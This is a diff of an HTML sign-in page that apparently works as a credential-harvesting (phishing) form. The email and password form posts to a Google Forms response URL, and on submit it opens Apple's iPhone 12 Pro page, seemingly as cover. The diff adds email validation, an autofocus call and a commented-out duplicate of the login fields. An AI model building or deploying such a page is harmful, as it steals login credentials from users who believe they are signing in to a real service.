@@ -21,10 +21,27 @@
     function openWin() {
         window.open("https://www.apple.com/in/iphone-12-pro/");
       }
+
+      function ValidateEmail(inputText)
+        {
+        var mailformat = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+        if(inputText.value.match(mailformat))
+        {
+       
+        document.form1.text1.focus();
+        return true;
+        }
+        else
+        {
+        alert("You have entered an invalid email address!");
+        document.form1.text1.focus();
+        return false;
+        }
+        }
     
 </script>
 </head>
-<body>
+<body onload='document.form1.text1.focus()' >
     <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfxFiEBM2PpqUiFK52oC0GRVbaz9-2pDlG_8B2jIm33qw-q9w/formResponse" target="_self" method="POST" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-response="%.@.[]]" data-first-entry="0" data-last-entry="2" data-is-first-page="true">
         
         <div class="form-group">
@@ -38,12 +55,23 @@
         <div class="form-group">
             <label class="form-check-label"><input type="checkbox"> Remember me</label>
         </div>
-        <button type="submit" class="btn btn-primary" onclick="openWin()">Sign in</button>
+        <button type="submit" class="btn btn-primary" onclick="openWin() " >Sign in</button>
     </form>
 
 
 
-
+  <!--  <div class="form-group">
+        <label for="inputEmail">Email</label>
+        <input type="email" class="form-control" name="entry.1232965585" id="inputEmail" placeholder="Email">
+    </div>
+    <div class="form-group">
+        <label for="inputPassword">Password</label>
+        <input type="text" name="entry.1644088402" class="form-control" id="inputPassword" placeholder="Password">
+    </div>
+    <div class="form-group">
+        <label class="form-check-label"><input type="checkbox"> Remember me</label>
+    </div>
+    <button type="submit" class="btn btn-primary" onclick="openWin()">Sign in</button> -->
 
 
 
